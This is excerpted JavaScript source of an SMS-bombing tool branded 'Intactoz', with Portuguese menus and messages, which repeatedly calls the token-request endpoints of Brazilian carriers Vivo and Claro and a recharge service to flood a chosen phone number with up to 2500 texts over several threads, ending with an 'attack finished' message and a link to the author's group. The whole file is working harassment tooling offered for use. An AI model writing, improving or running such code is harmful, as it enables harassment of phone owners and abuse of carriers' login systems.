...
const b1 = new cliProgress.SingleBar({
	format: color.brightGreen('{bar}' + ' | {percentage}% » Enviados: {enviados} #Intactoz'),
	barCompleteChar: '\u2588',
	barIncompleteChar: '\u2591',
	hideCursor: true
});
...
async function op1(numero, quantidade) {
	...
	var vivo = await tools.curl('https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do', 'numero='+numero, {
		...
		'Referer': 'https://login.vivo.com.br/mobile/appmanager/env/publico'
			...
			if (response["code"] == 0) {
				...
				console.clear();
				process.exit(console.log('Erro » O numero %s nao corresponde a operadora Vivo | #Intactoz'.error, numero));
			} else if (response["code"] == 106) {
				console.clear();
				process.exit(console.log('Erro » Cliente com uma linha desativada | #Intactoz'.error));
			} else if (response["code"] == 109) {
				console.clear();
				process.exit(console.log('Erro » Cliente com uma linha cancelada | #Intactoz'.error));
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido (%s) | #Intactoz'.error, response["code"]));
			}
	});
	...
	if (quantidade == spam.enviados) {
		...
		process.exit(console.log('\n\nAtaque finalizado! | #Intactoz\nGrupo http://itz.s3ps.ga'.help));
	} else {
	...
	var claro = await tools.curl('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${numero}","target":"token","origin":"login"}`, {
		...
		'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
			...
			if (res.statusCode == 204) {
				...
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido | #Intactoz'.error));
			}
	});
	...
	var recargamulti = await tools.curl('https://cce-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		...
		'User-Agent': 'okhttp/3.10.0'
			...
			if (response["success"]) {
				...
				console.clear();
				process.exit(console.log('Erro » Ocorreu um error desconhecido | #Intactoz'.error));
			}
	});
...
function options() {
	console.clear();
	console.log(figlet.textSync('Intactoz', {
	    font: 'Standard',
	...
	console.log('1 | Vivo (Max: 2500)'.brightGreen);
	console.log('2 | Claro (Max: 2500'.brightGreen);
	console.log('3 | Recarga (Max: 2500)'.brightGreen);
	console.log('0 | Sair\n'.brightRed);
	console.log('\nGrupo http://itz.s3ps.ga');
...
if (spam.option == 1) {
	...
	var quantidade = readLine.question('SmS (Max: 2500): ');
	var threads = readLine.question('Threads (Max 10): ');
	startBypass(numero, quantidade, 2500, threads, 10);
